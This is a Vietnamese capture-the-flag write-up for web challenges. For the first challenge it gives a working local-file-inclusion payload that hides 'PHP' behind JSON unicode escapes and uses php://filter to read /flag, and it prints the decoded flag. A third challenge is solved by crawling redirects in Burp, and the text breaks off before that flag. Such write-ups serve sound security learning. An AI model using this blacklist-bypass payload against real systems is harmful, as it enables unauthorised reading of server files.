## SOLVE

### WEB 1:

Đọc qua src code , có thể thấy web nhận POST request và có thể khai thác LFI.

> Khi gửi request , server trả về
>
> ![img](/imgs/response.png)


> `{"content":"Invalid content"}`
>
> do trong flag có "EHC" , đã blacklist.

Sau khi tra google thì e biết có 1 phương pháp encode base64 bằng php

> Gửi lại request cho server.
>
> ![img](/imgs/invalidreq.png)


> server vẫn trả về `{"content":"Invalid content"}` do trong request có chứa cụm "PHP", đã blacklist .

Sau 1 hồi tra google thì e lạI biết được json có escape char:
`\u+4-digits-hex`
--&gt; có payload

```json
{
    "page":"\u0050\u0048\u0050://filter/convert.base64-encode/resource=/flag"
}
```

> Gửi lại cho server , ta được flag :
>
> ![img](/imgs/flag.png)

> `{"content":"RUhDe3czbGMwbTNfdzNiX3c0cnJqMHJzfQo="}`
> Decode base64 , có
>
> ![img](/imgs/flagdecoded.png)

> FLAG: `EHC{w3lc0m3_w3b_w4rrj0rs}`

### WEB 2:

### WEB 3:( cách làm của em không hay lắm nma kết quả đúng:)))) )

Đầu tiên , em thử vào từng path của site , thấy:

> `https://web3.ehc-fptu.club/1 --> https://web3.ehc-fptu.club/api/viewflag`
> Điều tương tự cũng xảy ra với 3 và 0. Nhưng 2 và 4 lại not found. Vì vậy em vào burp và thấy các trang liên tục redirrect theo thứ tự và về 0.
> Dùng công cụ Crawl của burp , có flag: